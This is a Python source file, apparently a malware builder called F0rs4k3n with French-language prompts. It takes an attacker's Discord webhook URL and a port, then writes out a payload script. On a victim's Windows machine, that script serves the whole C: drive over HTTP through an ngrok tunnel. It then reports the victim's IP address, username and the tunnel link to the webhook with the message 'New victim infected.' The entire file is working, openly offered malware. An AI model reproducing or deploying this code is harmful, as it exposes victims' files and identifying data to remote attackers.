from colorama import Fore
from os import system, name


if name == 'nt':
    system(f"title F0rs4k3n")
    system("mode 160, 40")


def clear():
    system("cls") if name == 'nt' else system("clear")




clear()

print(Fore.CYAN)


print(" " + "━" * 158 + " ")


print(f"""

                                         :::::::::: ::::::::  :::::::::   ::::::::      :::     :::    ::: :::::::::: ::::    ::: 
                                         :+:       :+:    :+: :+:    :+: :+:    :+:   :+: :+:   :+:   :+:  :+:        :+:+:   :+:  
                                        +:+       +:+    +:+ +:+    +:+ +:+         +:+   +:+  +:+  +:+   +:+        :+:+:+  +:+   
                                       :#::+::#  +#+    +:+ +#++:++#:  +#++:++#++ +#++:++#++: +#++:++    +#++:++#   +#+ +:+ +#+    
                                      +#+       +#+    +#+ +#+    +#+        +#+ +#+     +#+ +#+  +#+   +#+        +#+  +#+#+#     
                                     #+#       #+#    #+# #+#    #+# #+#    #+# #+#     #+# #+#   #+#  #+#        #+#   #+#+#      
                                    ###        ########  ###    ###  ########  ###     ### ###    ### ########## ###    ####       
                                   ##                                                                                   ###       
                                                                par billythegoat356 | by billythegoat356 

""")


print(" " + "━" * 158 + " ")



url = input(Fore.BLUE + "\n\nEntrez l'URL du webhook > " + Fore.RESET)

port = input(Fore.BLUE + "Entrez le port que vous voulez utiliser > " + Fore.RESET)

try:
    port = int(port)
except:
    input(Fore.RED + "Erreur. Le port doit être un integer.")
    quit()

content = r"""
from pyngrok import ngrok

from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from threading import Thread
from urllib.request import urlopen, Request
from json import dumps

from os import chdir, getenv


lien = '""" + url + r"""'
port = """ + str(port) + r"""



headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }


chdir("C:/")



ip = urlopen("http://ipv4.plain-text-ip.com/").read().decode()
pc = getenv('username')

Handler = SimpleHTTPRequestHandler

def server():
    with TCPServer(("", port), Handler) as httpd:
        httpd.serve_forever()


Thread(target=server).start()


http_tunnel = ngrok.connect(addr = port)

link = str(http_tunnel)

try:
    link = link.split('"')[1].split('"')[0]
except:
    pass



embeds = [
    {
      "title": "F0rs4k3n",
      "description": "New victim infected.",
      "url": "https://github.com/billythegoat356/F0rs4k3n",
      "color": 0x0000ff,
      "fields": [
        {
          "name": "IP Address:",
          "value": ip,
          "inline": True
        },
        {
          "name": "PC Name:",
          "value": pc,
          "inline": True
        },
        {
          "name": "URL for data:",
          "value": link
        }
      ],
      "author": {
        "name": "billythegoat356",
        "url": "https://github.com/billythegoat356",
        "icon_url": "https://camo.githubusercontent.com/17a1ebec14bc2b0263d46efcdecacf1d535ffeb770834e7911b1e147e9b46e4c/68747470733a2f2f7a7570696d616765732e6e65742f75702f32312f32322f6f6536782e676966"
      },
      "footer": {
        "text": "by billythegoat356",
        "icon_url": "https://avatars.githubusercontent.com/u/77754159?v=4"
      },
      "timestamp": "2001-09-10T22:00:00.000Z",
      "image": {
        "url": "https://images-ext-1.discordapp.net/external/4MXrYzVuOfQptQjxsWu2f3NJAGkaVFcnjSupGINNHYo/https/i.pinimg.com/originals/70/f0/06/70f00604c310e33d67a9bb69c16bab1d.gif?width=504&height=439"
      },
      "thumbnail": {
        "url": "https://images-ext-1.discordapp.net/external/4MXrYzVuOfQptQjxsWu2f3NJAGkaVFcnjSupGINNHYo/https/i.pinimg.com/originals/70/f0/06/70f00604c310e33d67a9bb69c16bab1d.gif?width=504&height=439"
      }
    }
  ]


webhook = {"username":"F0rs4k3n", 
          "avatar_url":"https://camo.githubusercontent.com/17a1ebec14bc2b0263d46efcdecacf1d535ffeb770834e7911b1e147e9b46e4c/68747470733a2f2f7a7570696d616765732e6e65742f75702f32312f32322f6f6536782e676966",
          "embeds":embeds}


urlopen(Request(lien, data=dumps(webhook).encode('utf-8'), headers=headers))
"""


try:
    with open("f0rs4k3n.py", 'w', encoding='utf-8') as f:
        f.write(content)
    input(Fore.MAGENTA + "\n\nLe fichier à été crée dans votre répertoire actuel.")
except:
    input(Fore.RED + "\n\nErreur. Le fichier n'a pas pu être crée.")